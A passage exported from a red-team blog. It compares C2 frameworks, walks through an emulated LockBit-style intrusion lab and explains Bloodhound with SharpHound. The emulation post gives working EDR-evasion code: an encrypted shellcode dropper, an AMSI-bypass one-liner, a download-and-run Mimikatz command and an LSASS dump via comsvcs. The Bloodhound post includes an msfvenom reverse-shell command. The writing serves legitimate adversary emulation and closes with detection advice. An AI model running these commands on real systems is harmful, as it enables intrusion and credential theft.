a three way combination of Hasura, GraphQL, and Postgres to store, process, and display information and the database is secured through a randomly generated password that you can see in the .env file of your Mythic installation.What is the GUI likeThe Mythic GUI is intuitive to figure out with options to configure profiles, payloads, examine artifacts and findings, and export reports. To determine the admin password, you use a command line argument and it prints it out since each install has a randomly generated one. Generating new user accounts is simple enough through a provided menu and you can delegate admin access with just a button for each account.Implant generation optionsMythic takes a unique and interesting approach to generating implants. It comes with no native implant or listener options so instead you have to download some from a precompiled list on GitHub. Thankfully there are many implant options from Apfell to Merlin. This allows a lot of flexibility with what implants you want to use. The same is true for listeners, you need to download each one you want to use. I think this is a knock against the platform because they themselves don’t ensure that a base line will always be available and developed alongside the backend.For the purposes of this test, I chose to use an HTTPS listener because Merlin requires HTTPS to function with the HTTP2 protocol and the Merlin agent, just because I have a Merlin sticker on my water bottle and it’s the coolest looking design.A small annoyance is that compiling implants takes my VM a couple minutes. What’s a bigger annoyance, though, is that the listener profile defaults to HTTPS when creating a new listener but the listener profile defaults to SSL=false in the global configuration setting. So after generating an implant without issue, you will notice that they aren’t connecting back to the C2. You then go to the implant page and look at the details for the build, and there it tells you that you compiled for HTTP(S) but you have SSL set to false so this is something you need to fix.But why not just default to SSL being true in the HTTP profile or default to not using HTTP(S) in the implant?Apart from the above hiccup, there was a nice variety of OS and architecture options with Merlin and you could compile to target a number of systems that you are likely to see on an engagement. There were four Nix flavors ranging from Solaris to Linux as well as Mac and Windows, meaning you should have no trouble with compiling for enterprise environments.Interacting with agentsA feature I learned to love very quickly were the load/invoke-assembly commands. These allow you to load a .NET assembly into the implants process and then execute it as much as you wanted with any arguments without having to resend the assembly to the implant, which keeps your network footprint relatively low. For example with SeatBelt, I could just load it into the process space and then execute the command with an array of arguments.This is a huge quality of life feature. The same can be done for Rubeus and any other .NET compiled executable. I was curious if this would work with any PIC executable, but the feature specifically uses AppDomains which are a .NET specific environment to execute applications. The purpose behind AppDomains is that if they become unstable or threaten to otherwise crash, they can be unloaded without affecting the core process. This is important in the context of an implant as sometimes tools encounter unknown issues and panic, and if that were to affect the implant stability, it would be annoying having to achieve execution repeatedly. For those familiar with Cobalt Strikes sacrificial process - this is the same principle.Speaking of sacrificial processes, you can also that with create-process. From the description, this uses process hollowing to create a new child process and then collects stdout from it with anonymous pipes.Merlin also contains an option for shellcode reflective DLL injection which attempts to convert a DLL into shellcode. The code in Merlin has a nice chain of attributionWhat will perhaps be the second most useful command is token which allows you to steal another processes security token, among other useful args like getting the current context of your security token. A little background to security tokens is that in the context of Windows, for each and every process created there is a security token delegated to it. This allows the security boundary to only have to check the token privileges as opposed to reauthenticating the users privileges each time the object is called. Merlins documentation identifies that it uses the DuplicateTokenEx Windows function in order to accomplish this. It is important to note that this could be regarded by some SIEMs as a suspicious API call and cause an alert to fire. But this is a preferable trade off for privilege escalation as opposed to dumping LSASS.Post operation reportingA good quality of life feature that I liked is that you could name your operation, giving some personal flare and pizzazz to the exercise and allowing for easy organization. Generating reports is also very easy and allows you to see a breakdown of commands issued by each operator. For example, using the earlier SeatBelt command, we can see when it was issued and who by.EmpireA bit of background. PowerShell Empire (here after just referred to as Empire) was developed as a response to nation-state attackers using native PowerShell to launch their payloads in a fileless manner. At the time, since PowerShell was trusted by major vendors, EDR did not stop or detect PowerShell based attacks. Due to this, several members of the infosec community stepped up to create a post-exploitation kit that could demonstrate the severity of this threat. Then around 2020, the project shut down after the maintainers determined they had reached their goal of making vendors aware of this threat. Empire remained defunct until BC Security forked it and took over active development. Now, they make regular contributions to the project and have releases for big updates.BC Security’s biggest contribution has definitely been the Starkiller GUI for Empire. However, this leads into an issue: Where should I draw the line of saying that they built Empire? I will try my best to point out different contributions by each team because they merit individual consideration. For example, the original Empire team didn’t make very robust documentation and this would be a great place for a development team to make big strides. It would also make sense for a team taking over a new project to document all the functions in the app. Unfortunately, BC Security didn’t do that; the wiki is lacking a lot of information on how to navigate the Starkiller UI and I had to go to the C2 Matrix to even find the default username/password.The original Empire team did a fantastic job, obviously, with their PowerShell functions. At the time it was a unique framework and to see something like this released to the public for free, it made a big impact. This is evident by the quick adoption from nation-state actors as recognized by SANS and Microsoft. And this quick adoption prompted EDR vendors to step up their detection engines seriously in order to deal with what was now a pervasive threat.The new Empire team has also made a series of important updates to the platform. One of the first blog posts that BC Security did about Empire had to do with updating the CLI to interact with Empire through an API allowing multi operator interaction. That’s massive. Another huge update they did was to include the Python Prompt Toolkit. This allowed intelligent predicted response suggestions to what you are typing in real time. This isn’t even mentioning the Starkiller GUI that works on top of Empire.What is the GUI likeThe Starkiller UI is interesting. It’s still in its early infancy and there are many rough spots I’ve found. There are your typical pages for listing agents and creating new listeners, but it’s not intuitive to figure each menu out. For example, generating new implants is iffy. Instead of there being a page dedicated to it, you have to go through the stagers page. This seems counter intuitive and there’s no obvious indication saying that you generate your implants here. On top of that, the error messages don’t tell you anything. It would be working fine and then I would try to do something the app didn’t like and I get a 500 server error. But that’s all I’m told. I’m not told why the operation failed. I think detaching the stager options from the implant generation would make the menus feel more intuitive.Implant generation optionsWhen I first opened Empire I was a little surprised to see all the implant options. There are a staggering number ranging from Windows command exec options to generating a Nix WAR file. Then I looked further and thought to myself this looked a lot like Metasploit. And then looked even further at BC Security’s GitHub contributions and found that in a number of the Windows generators they were directly calling MSFVenom for payload generation options. It looks as though to add new features, instead of sticking with the theme of PowerShell, they implemented calls to Metasploit through the CLI and grabbed the output. I don’t like this approach because I think it detracts from the theme of the projects’ origins since MSFVenom generated executables aren’t “fileless.”Sliver did this too to an extent and I want to recognize how their approach differs from Empire. Sliver implements MSFVenom by working alongside it, using it to compliment some of their payloads and taking advantage of the encoder options. Sliver has also implemented in Go a technique for injecting Metasploit payloads into a remote process. It builds off of MSF as opposed to just calling it.BC Security does have a stated reason for this, however, which is worth a bit of discussion. The team recognized the smallest they could make an Empire payload was in the thousands of kilobytes. But by using MSFVenom for reverse shell stagers, they were able to reduce the file size to in the tens of kilobytes. This allows the payload to have a higher success chance in certain cases of buffer overflow attacks where the small buffer size does limit the attack surface. This doesn’t make a lot of sense to me because the staged options output executables for Windows instead of bytecode, and I don’t believe these executables are position independant code. But I may be wrong here!Empire does do a great job of providing a number of options for attacking platforms other than Windows. There’s eleven OSX attack types to choose from, each using very different techniques to accomplish execution. I didn’t get a chance to test these but I wonder how likely they are to work since they still closely resemble what the original Empire authors had crafted and Apple does not slack on patching security oversights I’ve found.Interacting with agentsThis is where I started to like Empire, and Starkiller, a lot more. There were some initial hiccups, but both the original developers and BC Security did a fantastic job with giving operators a full arsenal of tools. There is a silly amount of commands that you can run on agents. This is great because options! But also it can be bad and overwhelming because it is literally hundreds of possible commands ranging from PowerShell to Python to CSharp. If there were obvious categories that they could be grouped into and names given other than what reads like an internal notation, it would be much more legible. But as it stands, this makes the GUI feel crowded. Here’s a snippet halfway down the command list of what the options look like.Despite this, a feature I immediately liked was the ability to inject BOF’s similarly to Sliver. This greatly expands post compromise potential and feels very in the spirit of what Empire was initially about - fileless functionality. This was also coded in PowerShell and utilizes a function created by citronneur to load and map a BOF file into memory and then execute it in a manner defined by the user.A really cool feature in Starkiller is how they map commands to the MITRE ATT&amp;CK framework. This gives hints to what it could look like when reporting is released to the public since command mapping and attribution is a big part.Another interesting feature revealed itself when I was looking further at their Python scripts and one in particular caught my eye. This is the linuxprivchecker.py file. This is a pretty simple implementation that utilizes the os.popen Python function to execute a series of commands that gets the kernel version, network interfaces, cron jobs, and other system info. Looking at the code, it’s definitely not OPSec safe, and the Starkiller UI makes sure to tell you. This is a nice touch to help remind operators when commands will definitely reveal them.I would love to see some contributions to the credential module page to include token stealing through a .NET implementation of DuplicateTokenEx similar to how Merlin did this, as relying on LSASS dumping through Mimikatz is regarded as an old tactic now.Post operation reportingThere is an option for reporting but it is locked behind the sponsored version as of the time of writing.When might you want one or the other?Mythic wins out on their reporting feature and robustness of the API. However, you will probably want an experienced developer on the team that can work with their API so you’re not reliant on 3rd parties that could drop support for their profiles or agents on a whim. That being said, Empire in its current form is not nearly as feature rich or advanced as Mythic. It lacks core commands that Merlin provided and the Starkiller GUI is currently a lot more complicated than Mythic. I think Mythics post engagement reporting should be a core feature that more platforms aspire to as it provides a great tool for both in the moment deconfliction and a starting point for discussion with stakeholders afterwards. It allows teams to point out which commands were not caught or otherwise flew under the radar.I am not a fan of Empire in its current form and I think that came across in the section on it. If you read that section and thought I was a total moron, fair enough! I may just not “get” Empire like others have, and I know nation-state actors continue to abuse it to this day. But they’re not using off the shelf copies of Empire that match the latest release. The same is true of Mythic. On Shodan, there are less than fifty instances of Mythic publicly exposed that are running the default configuration. Forking a project as well known as Empire in order to take over active development is a big task. It would be big for anyone. You have a whole code base to familiarize your team with, interactions between different components to understand, and you have to develop community interaction to understand friction points within the software. And BC Security has definitely done this. They run workshops, they offer trainings, they have an active blog on their website which I’m a big fan of. I almost think it would have been easier to start from scratch with making a new C2 as opposed to trying to make Empire work in the manner they want. But I applaud their efforts to keep Empire current and make it an appealing platform for teams looking for open-source solutions." }, { "title": "Adversary Emulation Exercises", "url": "/posts/Adversary-Emulation-Exercise/", "categories": "redteam, TECHNICAL, offensive-security", "tags": "redteam", "date": "2023-04-10 00:00:00 +0000", "snippet": "Running An Adversary Emulation ExerciseAdversary emulation can take many forms, but it will always have the same end goal. Helping companies come away knowing how to defend themselves better. You c...", "content": "Running An Adversary Emulation ExerciseAdversary emulation can take many forms, but it will always have the same end goal. Helping companies come away knowing how to defend themselves better. You can bypass every defense and find every flaw but if they don’t come away from the engagement knowing how to better defend their data, then you haven’t generated any value for them, only a payday for yourself. Here I will take a known adversary that is relevant to our mock industry and determine their tactics, techniques, and procedures (TTPs) and then apply that to our domain and evolve the attack with custom methods as the emulation progresses.TTPs to emulateHow do you choose the right TTPs? This is a hard question with many valid answers. You have the government, you have public companies, you have your own experience. Realistically, you will want a combination of all those. For this exercise, I’ll take a report from the financial services sector on ransomware gangs and find an adversary that can be emulated. FS-ISAC is a trusted source for this information and in their latest report they specifically name LockBit as the primary threat. Sophos has a rundown on LockBit 3.0, including a deep dive into their leaked tool sets and a section on their initial access. The tooling we observed the attackers using included a package from GitHub called Backstab. The primary function of Backstab is, as the name implies, to sabotage the tooling that analysts in security operations centers use to monitor for suspicious activity in real time. The utility uses Microsoft’s own Process Explorer driver (signed by Microsoft) to terminate protected anti-malware processes and disable EDR utilities. Both Sophos and other researchers have observed LockBit attackers using Cobalt Strike, which has become a nearly ubiquitous attack tool among ransomware threat actors, and directly manipulating Windows Defender to evade detection.This has given us two critical pieces of information. 1) The adversary uses Cobalt Strike primarily and 2) They use an open source software (OSS) tool called Backstab to kill the endpoint detection and response software (EDR). Later it is also mentioned that LockBit deploys Mimikatz post exploitation in order to grab passwords, so we’ll include that as well. This gives us some primary goals during testing to evaluate. Importantly, we don’t have to stick with just LockBit. There are any number of adversary groups out there at one time and they are all constantly evolving their techniques, so you should have the freedom to introduce new TTPs where there is an identified weakness.What tools to useSliverWhen it comes to free C2’s, you’re not short of options. You can even find cracked copies of most of the paid platforms. However, for our needs, Sliver will more than suffice. They have a wide range of post exploitation tools and can output in a few different formats. They also have support for Cobalt Strikes beacon object file format (BOF), which will come in very handy later as the emulation progresses past the TTPs decided on above.MimikatzMimikatz is a ubiquitous tool used post exploitation in order to dump passwords. It’s used for post exploitation tasks like elevating privileges, move laterally, and extract passwords. It’s marked by every EDR out there, so changing how it’s dropped is important.BackstabLike Sophos explained, Backstab is a tool employed by adversary groups in order to defeat EDR. It’s publicly available on GitHub, you just need to download and compile it. I suggest following CptMeelo here for how to make your compiled version mobile easily. The author describes Backstab as follows: Have these local admin credentials but the EDR is standing in the way? Unhooking or direct syscalls are not working against the EDR? Well, why not just kill it? Backstab is a tool capable of killing antimalware protected processes by leveraging sysinternals’ Process Explorer (ProcExp) driver, which is signed by Microsoft.We can use this tool to kill any running process on the system by just giving it a PID.Developing the dropperAs we are looking to bypass a real endpoint protection software (EPP) for this mock exercise, we should spend a moment touching on how the dropper will be developed, different bypass methods used, and different obfuscation techniques. The general idea will be to have a Sliver payload that is encrypted at rest in the resources section of an executable and, when launched, connects back to the primary C2 to allow us to drop further tools and perform additional actions. It’s nothing innovative, but it works for this.Obfuscating function callsWhen loading our payload, we have to do a number of things. This includes allocating the memory space, setting memory permissions, and executing it. These are all functions that reverse engineers and malware analysts look for, so let’s make it harder. Take, for example, the function CreateThread. Malware loves to use this for executing memory locations once a payload is copied into there, and so obviously this will raise flags when spotted. But what if you could hide it entirely on your import table? If you go to the MSDN documentation of CreateThread you will see the parameters it takes:HANDLE CreateThread( [in, optional] LPSECURITY_ATTRIBUTES lpThreadAttributes, [in] SIZE_T dwStackSize, [in] LPTHREAD_START_ROUTINE lpStartAddress, [in, optional] __drv_aliasesMem LPVOID lpParameter, [in] DWORD dwCreationFlags, [out, optional] LPDWORD lpThreadId);We can use this in our implant to avoid having to import at run time by inserting this line before the function call:HANDLE (WINAPI * pCreateThread)(LPSECURITY_ATTRIBUTES lpThreadAttributes,SIZE_T dwStackSize,LPTHREAD_START_ROUTINE lpStartAddress,__drv_aliasesMem LPVOID lpParameter,DWORD dwCreationFlags,LPDWORD lpThreadId );What we’ve done here is creating a WINAPI pointer to the function, and it can be done for a lot of our imports.Encrypting our payloadThe fastest way to be caught is to use a payload easily identifiable to the EPP. The easiest way to not be caught, then, is to encrypt our payload until run time. For this section, I updated the Python script from Sektor7’s red team operator course to be Python3 compatible. This way, we can now feed our outputted shellcode file from Sliver into our encrypt function, get a key and encrypted payload, and then hide that further in our dropper. I don’t want to share too much of reenz0h’s work, so I’ll keep it simple by supplying only pieces I’ve found also on StackOverflow from a decade ago.The padding function is as follows:def pad(s): length = 16 - (len(s) % 16) s += bytes([length])*length return sAnd the encrypting function is as follows:def aesenc(plaintext, key): iv = 16*'\\x00' iv = bytearray(iv, 'utf-8')\tk = hashlib.sha256(key).digest()\tplaintext = pad(plaintext))\tcipher = AES.new(k, AES.MODE_CBC, iv)\treturn cipher.encrypt(bytes(plaintext))We generate a key through using the urandom import and call the aesenc function through this:plaintext = open(sys.argv[1], \"rb\").read()ciphertext = aesenc(plaintext, KEY)Then to get the output looking nice we do some string manipulation and write it to the resource.ico file:print('AESkey[] = { 0x' + ', 0x'.join(hex(x)[2:] for x in KEY) + ' };')imm_by = bytes(ciphertext)with open('resource.ico', 'wb') as file: file.write(imm_by)Then at run time, we decrypt it using the native Windows Crypto API functions:int AESDecrypt(char * payload, unsigned int payload_len, char * key, size_t keylen) { HCRYPTPROV hProv; HCRYPTHASH hHash; HCRYPTKEY hKey; if (!CryptAcquireContextW(&amp;hProv, NULL, NULL, PROV_RSA_AES, CRYPT_VERIFYCONTEXT)){ return -1; } if (!CryptCreateHash(hProv, CALG_SHA_256, 0, 0, &amp;hHash)){ return -1; } if (!CryptHashData(hHash, (BYTE*)key, (DWORD)keylen, 0)){ return -1; } if (!CryptDeriveKey(hProv, CALG_AES_256, hHash, 0,&amp;hKey)){ return -1; } if (!CryptDecrypt(hKey, (HCRYPTHASH) NULL, 0, 0, payload, &amp;payload_len)){ return -1; } CryptReleaseContext(hProv, 0); CryptDestroyHash(hHash); CryptDestroyKey(hKey); return 0;}We have all the pieces ready for encrypting and decrypting but how do we tell our app to compile with this as a resource? We will need two additional files for this. resources.h will hold a simple declaration #define FAVICON_ICO 100 and resources.rc will hold the following:#include \"resources.h\"FAVICON_ICO RCDATA resource.icoRetrieving our encrypted payload from the resources section can be done with the below:res = FindResource(NULL, MAKEINTRESOURCE(FAVICON_ICO), RT_RCDATA);resHandle = LoadResource(NULL, res);payload = (char *) LockResource(resHandle);payload_len = SizeofResource(NULL, res);Something like this can be used to then compile the code from the CLI. Or you can just use VisualStudios GUI.Putting this altogether, to generate our Sliver payload we need to start a listener and output a beacon to a shellcode format. Feed this through the script and output it encrypted to another ico resource file, which we’ll then include in the resources section of our implant. The process of doing this turned out to be much more complicated than I anticipated. Over the course of building this, I removed the IV declaration because I thought the AES library documentation said that if you don’t supply one, it will auto generate one for you. All fine and good in my mind. That was until I went to decrypt at run time and for some reason the first block of bytes would be decrypted incorrectly. The issue turned out to be that I was mistaken and by not supplying an IV at encryption time, when it came to decrypt, the CBC cipher couldn’t do the first block. But this also highlights the issue with CBC. Other ciphers will derive the IV for subsequent blocks from the first blocks decryption, but with CBC only the first block gets XOR’d with the IV and that’s it. Once past this, the shellcode decoded properly in memory but I still wasn’t seeing a connection back. The final issue here turned out to be that the Shikata Ga Nai encoder needed to be disabled at implant generation time with the flag --disable-sgn in Sliver.Initial accessLockBit is able to establish initial access through phishing, exploiting public web apps, or through exposed remote desktop protocol. For the sake of our exercise, we will assume that our target has been phished with a OneNote attachment and the beacon was fetched and executed successfully.Establishing persistencePost exploitation, maintaining persistence is one of the more important steps to take. A common way to do this is to add a registry key to the machine that will run our beacon on startup. Another way to maintain persistence employed by LockBit is to add a key to HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\WinLogon with the value /v Shell /d \"explorer.exe, beacon.batch\" /f and load a few configuration options into the batch script for downloading and running it. Testing both of these methods is relevant for determining alert coverage level.Dumping credentialsWe now have a persistent implant running on the host. Our next step is to get some credentials. We can obfuscate Mimikatz for this an drop it to disk, or we can choose to run it in memory and avoid dropping it to disk entirely. The latter can be done with the following PowerShell:IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/Invoke-Mimikatz.ps1'); Invoke-Mimikatz -DumpCredsHowever, running this from the command prompt gets it flagged immediately by the AMSI service on Windows and generates an alert. We need a way to disable or bypass AMSI so that we can continue uninterrupted. A simple search though in GitHub brings us to a page of updated AMSI bypasses. From there, this one-liner was able to disable AMSI:$a='si';$b='Am';$Ref=[Ref].Assembly.GetType(('System.Management.Automation.{0}{1}Utils'-f $b,$a)); $z=$Ref.GetField(('am{0}InitFailed'-f$a),'NonPublic,Static');$z.SetValue($null,$true)Let’s break this down. First I declare si and Am as two variables. I then get the type of AmsiUtils which looks like the below.Then I use the type to get the field from amsiInitFailed called 'NonPublic,Static' and set it to True. Compare the below images to see what the field looks like before and after the completed AMSI bypass.This technique is an evolution to the one from Matt Graeber discovered in 2016, with the only change really being additional obfuscation. It allowed for us to download and execute Mimikatz in memory which is what we needed for progressing to the next step.What about Backstab?Backstab simply wasn’t needed for this. Had there been a different EDR running to try and protect us, it would have come more into play then, but as it stood an AMSI bypass was all it took to let us run through the Defender protected domain unimpeded. For testing’s sake, Backstab was dropped to disk in order to evaluate the detection and used to kill a number of processes, all of which Defender let happen without a care in the world.Exfiltrating from the fileshareOften times in these exercises people think of domain admin as the end-all be-all goal. Unlocking this should unlock the keys to the kingdom. And blue teams know this, which is why there is an absurd amount of alerting around the role. So always gunning for getting DA may actually get your cover blown faster than determining what is valuable to the company and taking that. In our case, since we are a financial services company, this will be financial information such as customer records improperly stored in a fileshare. And exfiltrating these is actually on track for ransomware gangs, they have pivoted to not just encrypting files but also stealing them to ensure a ransom is paid.In our example, there are a couple file shares. One has general scripts and one with financial information. The financial information share is privileged to only a few teams but the script share is wide open to most members in order to facilitate faster sharing. As it so happens, a Windows admin on the IT team also stores their automation scripts here and the file server needs one of them to stop and start a service on a schedule. We can change that script that it is reading from to do its normal actions, but at the end download and execute our beacon from the C2. Then all we have to do is wait for this service to run and we should see a new session generated in Sliver.Now that we have the new machine compromised, we want to do the same thing we did on the first server and bypass AMSI before dumping users with Mimikatz. Then we run through the same process of elevating to this new user and access the share with their permissions before finally exfiltrating the sensitive documents.What if we wanted to do something more interesting though? What we did here did get us results, but it made a lot of noise and it was a little hacky. Let’s rewind back to when we first dropped the beacon.Evolving the attackAfter dropping the beacon and getting execution and then persistence, the next step was to dump credentials through Mimikatz and an AMSI patch. That’s all fine and dandy, but Sliver offers built in tools to do a lot of this. This was mentioned briefly in January in the rundown of Sliver v Havoc, but let’s take the opportunity and really flex Armory here.First, I want to determine the users password. There’s a lot of options for doing this, but let’s just ask them. Armory has an option for this called c2tc-askcreds which will pop a box and ask them to enter their username and password.When they enter their credentials here, you should see this reflected back in the Sliver console.After getting credentials, what’s next? The prior method for lateral movement was suboptimal. It relied on taking advantage of a poorly configured service. We don’t need to do that though. Another method is to use SharpMapExec which we can use in conjunction with the newly acquired credentials to see if there are any high level saved accounts in LSASS process memory.sharpmapexec ntlm winrm /user:USER /password:PASSWORD /computername:COMPNAME /domain:culbertreport.com /m:comsvcsLocate a user who looks privileged and grab their password value!But wait! There’s more! An even easier method to dump LSASS is to use the built in DLL comsvcs.dll and then exfiltrate that dumped file. This will just require further examination in Mimikatz or a similar tool. You can use Sliver to determine the LSASS Process ID (PID).rundll32.exe C:\\Windows\\System32\\comsvcs.dll MiniDump PID lsass.dmp fullA final alternative approach is to go hands on keyboard, open an RDP session, and run Process Hacker as an Admin and make a dump of LSASS that way, again examining it with Mimikatz.Regardless of what method you choose, I now have their encrypted credentials, so what can I do with them? Through Armory, I can additionally use Rubeus to generate a Kerberos ticket granting ticket and apply it to our current session.rubeus asktgt /user:USERNAME /rc4:PASSWORD /pttThe /ptt is what will apply this to our current shell.Now that we have this, just enter a new PowerShell session on the fileshare and bob’s your uncle.ResultsThis lab is definitely bordering on a worst case scenario. There is no enterprise EDR and no SIEM and the only defense is Defender. Regardless, our imaginary IT/Sec team should come away from this emulation with a lot of knowledge now about insecure permissions, overly permissive service boundaries, and improperly secured LSASS. Our dropper was able to run uninhibited after decrypting in memory and utilizing a number of suspicious Windows API calls, Mimikatz was entered into the command prompt and this didn’t set off an alarm, and Backstab could kill processes with impunity. After the adversary TTPs were run through, additional TTPs were introduced in the form of SharpMapExec and Rubeus and neither of those were stopped or alerted on either.Taking what was learned here, I should be able to present this to my leadership team in order to justify new expenses like a SIEM for logging and alerting and a better EDR solution. But what kind of alerts should be generated? Relying on static signatures of the binary and payload code is easy to bypass, but behavioral alerting is a lot trickier to get around. For instance, our registry modification should always create an alert especially when an item is added to run at startup. Then following that, PowerShell commands like InvokeExpression(IEX) and Net.WebClient are common commands used in attack scenarios and should also generate an alert on use. Additionally, using comsvcs or any other method to access LSASS should generate an alert. Speaking of, LSASS protection is a major priority for many companies. Had this been enabled, SharpMapExec and Mimikatz would not have been able to pull passwords out of that memory space. Microsoft has extensive documentation on how LSASS is abused by threat actors and what you can do to protect it. These policies should be rolled out domain wide.Data loss protection (DLP) is something that may come to mind as a possible solution to this scenario. There are a lot of products that offer DLP and very few EDR vendors roll it into their offering, so it would most likely be an additional expense you have to consider. You also have to consider the target threat that DLP addresses. Rarely will it prevent custom protocols from being used to read and send file contents out of the company, its primary target will often instead be insider threats - people who, for one reason or another, try to email or upload sensitive information to outside the bounds of the company.This lab really just scratched the surface of potential methods for privilege elevation, lateral movement, and data exfiltration. There is a lot more that can be done both from the defenders and attackers, such as abusing certificate services as outlined in Certified Pre-Owned. I hope to revisit this soon to explore more of those attack paths as well as containers and cloud security." }, { "title": "Bloodhound basics", "url": "/posts/Bloodhound/", "categories": "beginner, offensive-security", "tags": "", "date": "2023-03-08 00:00:00 +0000", "snippet": "BloodhoundWhat is it?Bloodhound describes their product as using graph theory to reveal hidden and unintended links between users and groups that makes lateral movement easier for attackers. Natura...", "content": "BloodhoundWhat is it?Bloodhound describes their product as using graph theory to reveal hidden and unintended links between users and groups that makes lateral movement easier for attackers. Naturally this is fantastic for defenders as well since you can view these paths and preemptively close them off or create alerting around when they’re traversed.Setting up an AD environment with BadbloodFirst things first, I do not have a thousand person company with which to test active directory relationships. I also don’t want to spend hours upon hours creating this by hand. Thankfully, someone else also didn’t want to do this and so automated it! Enter Badblood. This is a Powershell script that can be used to fill an AD environment with randomness. Thousands of users and groups and relations with which to test and play around with. This can be downloaded from their Github page, and running it is as simple as launching an admin Powershell window, navigating to the folder, setting the execution policy to unrestricted with set-executionpolicy unrestricted, and then launching it with .\\Invoke-badblood.ps1.Now this is an AD environment!Running BloodhoundFor this example, we’ll be running Bloodhound from our Kali machine, emulating the attacker. The first step is to install neo4j through sudo apt install neo4j - this is needed as it is our graph database management system. Start it with sudo neo4j start and after waiting a minute, browse to http:localhost:7474 and login with the username and password neo4j/neo4j. Set a new password here to whatever you want, and we’re now ready to install Bloodhound. Just like before, we’ll install this with sudo apt install bloodhound and start it with sudo bloodhound. You should see the Bloodhound screen popup with similar to this.This is great and all, but our database is empty. There are no complicated AD relationships to untangle. So let’s change that. We could just generate random data for a DB with a provided Python script, or we could practice taking that data from a DC.Enter SharpHoundSharphound is a .NET executable that, when run, uses LDAP to collect information on all OU’s, computers, accounts, and groups, as well as the links between them. This can uncover a lot of otherwise impossible to discover links between groups and users. We can run SharpHound from our C2 in order to generate some data for BloodHound. For this, we will be running Sharphound from a Metasploit console just for ease of reproduction - it’s free and everyone has a copy! First, we’ll use msfvenom in order to generate the staged dropper.msfvenom -p windows/meterpreter/reverse_https lhost=192.168.1.50 lport=443 -f exe &gt; dropper.exeThen, we’ll host a listener through Metasploit with the multi/handler.Once started, we’re ready for the staged dropper to connect back and start our session. Upload Sharphound to the victim through upload SharpHound.exe and run it with execute -f SharpHound.exe. This will start a new process and pop a very obvious shell window on the victim machine that shows Sharphound executing.This can be hidden by first dropping into a shell with shell and then running SharpHound through PowerShell.exe -WindowStyle hidden C:\\Users\\matt\\Downloads\\SharpHound.exe. Finally, grab the output from Sharphound which is a zip file with download &lt;filename&gt;.What info is gleaned?Drag and drop this zip into Bloodhound and we’re ready. Upon first examination of the data in Bloodhound, it’s a huge mess.However, within this, we can identify some interesting lateral movement paths that bring us to domain admin.If we then focus in on one path only, we can see that there exists a number of group chains that connects the unprivileged account of Roger Lowery to Ellen Hale.Let’s see how this looks in AD to get an idea of the path that Bloodhound has identified.This is odd. We can see the group memberships flowing from Roger up through LA-CAS-DISTLIST1 but where is this link to KA-COC-ADMINGROUP1 coming from? The answer is the AD permission GenericAll. GenericAll grants the group full permission over the object, much like Domain Admin.They have all permissions possible. This is outlined in the security tab of the AD object as an extra set of permissions that are granted. And not only does this group we’re looking at have GenericAll permissions to another group, that next group has GenericAll permissions to the Domain Admin Ellen Hale, giving us our attack path. This is what makes Bloodhound stand out, finding things like these obscure permission settings that are not immediately obvious.Helpfully, Bloodhound gives us the commands that we need to run in order to abuse this group relationship. You can see these by right-clicking the attack path and selecting help, then going to the “Abuse Info” tab.Opsec considerationsSharpHound is designed to blend in with normal AD traffic, but there are certain key details you can hunt for. Event ID 5156 is generated en masse in the security logs when SharpHound starts, querying LDAP.Another thing to consider is the commands that are suggested in the attack path. They are the “easiest” ways to perform the privilege escalation, but they are also noisy and that attracts attention. Bloodhound recommends importing PowerView to the endpoint in order to perform a lot of privilege escalation and, while this will create less alerts compared to just running net group \"Domain Admins\" userName /add /domain, PowerView gets detected very quickly. This can be mitigated to a degree by changing the hash, reducing the amount of engines statically detecting it. But there’s still a high risk at run time that the commands will raise flags." }, { "title": "Sliver vs Havoc", "url": "/posts/Sliver-vs-Havoc/", "categories": "redteam, TECHNICAL, offensive-security", "tags": "redteam", "date": "2023-01-13 00:00:00 +0000", "snippet": "Sliver vs Havoc - Two Adversary Emulation FrameworksI wanted to objectively measure two well known frameworks against one another and see which fits certain needs best. To this end, each platform h...", "content": "Sliver vs Havoc - Two Adversary Emulation FrameworksI wanted to objectively measure two well known frameworks against one another and see which fits certain needs best. To this end, each platform has been measured by if you can expand on them, how easy they are to get using,and why you might want one over the other. Before going further, for those unfamiliar, both Sliver and Havoc are command and control frameworks that are free to use on GitHub. Sliver is developed by BishopFox and is a reasonablyold project that first started in 2019. It’s seen some major upgrades since then, with the most recent being in October 2022. Havoc is a much newer tool developed by three independent contributors that was first started in September 2022. Both teams are responsive to questions and issues and, since they’re open source, you are free to expand on themas you need. With that said, the first question that should be answered is how easy is it to spin one of these up?How easy is it to spin one up and get going vs the other?Havoc Havoc utilizes team profiles at launch to dictate implant functionality The documentation is fairly well laid out, but online only. You should have prior knowledge with C++ and implementing bypass techniquesbecause out of the box the implants are detected quickly.Havoc is very neat. Much like Cobaltstrike, you can start the teamserver by passing it a json profile of users and their passwords as well as some general functionality things like sleep time and jitter of your implants. An opsec concern right off the bat for teams may be that the passwords in this file not encrypted, so setting proper read permissions of it and the directory is very important. Once the server is started, the dashboard is very intuitively laid out if you’ve ever used Cobaltstrike.Starting a listener is easy as well. Hitting view -&gt; listeners allows us to add a new one. From here, you just stepthrough the simple option menu and configure a few things like the port, if we’ll be using hostnames, and the header touse, and you’re set.And the payload options, while slim, have enough to them that we can make the necessary modifications to let themslip by the EDR we anticipate meeting. We can output in four file formats. These are exe, dll, shellcode, or service exe.The default implant of an EXE gets detected very quickly, so we’ll be testing the shellcode option here and implant itthrough the resource section of another EXE we develop ourselves.Next, we have to select the memory allocation and execution methods. For those, our options are syscalls or Win32.My understanding is that this means either performing a VirtualAlloc or NtAllocateVirtualMemory in the case of allocation, and for execution it would be NtCreateThreadEx or CreateRemoteThread.NtAllocateVirtualMemory is typically called through VirtualAlloc since it is an undocumented function. As we brieflytouched on in the NTDLL article in September 2022, these undocumented functions can change on a dime but are very usefulfor bypassing detection methods that focus solely on break points in NTDLL when called. Their downside is that seeing syscalls like this isquite unusual and alarming, so EDR watching for this could alert very quickly.VirtualAlloc on the other hand is the lowest level call from user space that we can perform and hooks into Ring0using syscalls to allocate memory within the bounds of what’s known as the system granularity boundary. For mostWindows systems, this will be 64kb. Allocations also must be a multiple of this boundary, so for example a 3 byte allocationwould cause errors. Moving to the execution methods, NtCreateThreadEx is the undocumented, lower level, version of CreateRemoteThread. Like NtAllocateVirtualMemory, it is contingenton syscalls being up to date and suffers from the same pitfalls. CreateRemoteThread is much safer but also easierto detect. Finding a balance between the two options is important when generating your implant. Different EDR mightbe tuned to detect one method more over the 